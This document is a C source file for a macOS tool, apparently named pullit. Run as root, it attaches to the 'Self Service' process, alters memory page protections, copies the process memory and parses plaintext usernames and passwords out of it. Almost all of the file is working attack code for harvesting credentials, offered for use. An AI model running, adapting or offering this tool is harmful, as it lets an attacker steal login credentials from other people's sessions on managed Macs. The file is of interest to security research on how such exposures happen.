/*
 * Author: 	Nat Hirsch <morgothan@0xdeadbeef.us>
 * Description: Look for plaintext username and password in
 *              memory from running self service process
 * Requirement: MacDBG, compliled static.  
 * 		Make all
 * 		libtool -static debug_main.o util.o breakpoint.o exception.o memory.o thread.o dyldcache_parser.o .mach_gen/mach_excServer.o .mach_gen/mach_excUser.o -o libmcdb.a              
 * Compile: 	gcc -std=gnu99 libmcdb.a pullit.c -o pullit
 * Usage: 	sudo ./pullit
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <mach/mach_types.h>
#include <mach/mach_traps.h>
#include <limits.h>
#include <mach/boolean.h>
#include <mach/error.h>
#include <mach/mach_error.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <mach/mach.h>
#include <errno.h>
#include <mach/mach_vm.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/time.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include "mcdb.h"
#include <sys/sysctl.h>
#include <termios.h>


// global for long jump in event of a segfault;
jmp_buf buf;

/*
 * catch segfaults
 */
void almost_c99_signal_handler(int sig)
{
longjmp(buf, 1);
}
/*
 * register the signal handler
 */
void set_signal_handler()
{
	signal(SIGSEGV, almost_c99_signal_handler);
}
/*
 * bullsh*t OSX way of doing unbuffered user input
 */
int mygetch()
{
	struct termios oldt;
	struct termios newt;
	int ch;
	tcgetattr(STDIN_FILENO, &oldt);
	newt = oldt;
	newt.c_lflag &= ~(ICANON | ECHO);
	tcsetattr(STDIN_FILENO, TCSANOW, &newt);
	ch = getchar();
	tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
	return ch;
}
/*
 * Actual heavy lifting. Reads a copied block of memory from target process
 * looks through the copied memory for the username string if it finds that
 * parses the string and pulls out the username and password values. Prints
 * them and asks the user if they want to look for more.
 */
void checkit(char *mem, int size)
{
	char *username = "username=";
	char *search;
	int i;
	char *user;
	char *pass;
	char more = 'Y';
	for (i = 0; i <= size - sizeof(username); ++i) {
		search = (mem + i);
		/* there has to be a more elegant way to do this. */
		if (!strncmp(search, username, sizeof(username) + 1)) {
			printf("[+] Found Credentials!\n");
			printf("[+] Full String: \"%s\"\n", search);
			user = strtok(search, "&");
			pass = strtok(NULL, "&");
			user = strtok(user, "=");
			user = strtok(NULL, "=");
			pass = strtok(pass, "=");
			pass = strtok(NULL, "=");
			printf("[+] Username: %s\tPassword: %s\n", user, pass);
			printf("[?] Look for more (Y/n)?");
			more = mygetch();
			printf("\n");
			if (more == 'n') {
				printf("[+] Exiting on user request\n");
				exit(0);
			}
		}
	}
}
/*
 * finds and return the PID for self service
 */
int get_pid()
{
	int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};

	size_t sz;
	sysctl(mib, 4, NULL, &sz, NULL, 0);

	struct kinfo_proc *procs = malloc(sz);
	sysctl(mib, 4, procs, &sz, NULL, 0);

	int proc_count = sz / sizeof(struct kinfo_proc);
	int i;
	int pid = 0;
	for (i = 0; i < proc_count; ++i) {
		struct kinfo_proc *proc = &procs[i];
		if (!strcmp("Self Service", proc->kp_proc.p_comm)) {
			pid = proc->kp_proc.p_pid;
			break;
		}
	}

	free(procs);
	return pid;
}


int main(int argc, char **argv)
{
	pid_t pid;
	int i = 0;
	int j = 0;
	int regions = 1;
	int state = 0;
	char *mem;
	mach_vm_address_t base;
	mach_vm_address_t past = 0;
	mach_vm_address_t addr;
	vm_region_t **vm_region_list;
	mach_port_t task;

	if (geteuid() != 0) {
		fprintf(stderr, "[-] are you root?\n");
		exit(1);
	}
	set_signal_handler();
	printf("[+] Looking for Self Service\n");
	pid = get_pid();
	if (!pid) {
		fprintf(stderr, "[-] Not found. exiting\n");
		exit(2);
	}
	printf("[+] Self Service found: %d\n", pid);

	task = attach(pid);
	printf("[+] ATTACHED TO PROCESS %d WITH TASK %d\n", pid, task);

	base = get_base_address(task);
	addr = base;
	while (regions) {
		vm_region_list = get_memory_map(task, addr, &regions);
		printf("[+] Found %d regions\n", regions);
		for (i = 0; i < regions; ++i) {
			if (past > vm_region_list[i]->address_start) {
				printf("\n[!] Looped around somehow, exiting gracefully\n\n");
				exit(256);
			}
			printf("[+] Region %d:%d;\n[+]\tType:\t%s\n[+]\tBase Address:\t%016llx\n[+]\tEnd Address:\t%016llx\n[+]\tSize:\t0x%llx (%lld bytes)\n[+]\tPermissions:\t%s \n",
			       j, i, user_tag_to_string(vm_region_list[i]->region_type), vm_region_list[i]->address_start, vm_region_list[i]->address_start + vm_region_list[i]->size,
			       vm_region_list[i]->size, vm_region_list[i]->size, get_protection(vm_region_list[i]->protection));
			if ((vm_region_list[i]->protection) & 1) {
				printf("[+]\tMaking Local Copy of Memory\n");
				mem = (char *)read_memory_allocate(task, vm_region_list[i]->address_start, vm_region_list[i]->size);
			} else {
				printf("[+]\t\tChanging memory permissions\n");
				state = vm_region_list[i]->protection;
				change_page_protection(task, vm_region_list[i]->address_start, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
				printf("[+]\t\tMaking Local Copy of Memory\n");
				mem = (char *)read_memory_allocate(task, vm_region_list[i]->address_start, vm_region_list[i]->size);
				printf("[+]\t\tChanging memory permissions back\n");
				change_page_protection(task, vm_region_list[i]->address_start, state);
			}
			printf("[+]\tSearching local copy for username and password string\n");
			checkit(mem, vm_region_list[i]->size);
			free(mem);
		}
		printf("[+] Completed searching %d regions\n", i);
		past = addr;
		addr += base;
		if (setjmp(buf)) {
			fprintf(stderr, "\n[!] Segfault at 0x%llX\n\n", addr);
			past = addr;
			addr = vm_region_list[i]->address_start + vm_region_list[i]->size;
		}
		j++;
	}
	printf("\n[+] Completed searching through allocated memory\n");
	return 0;

}
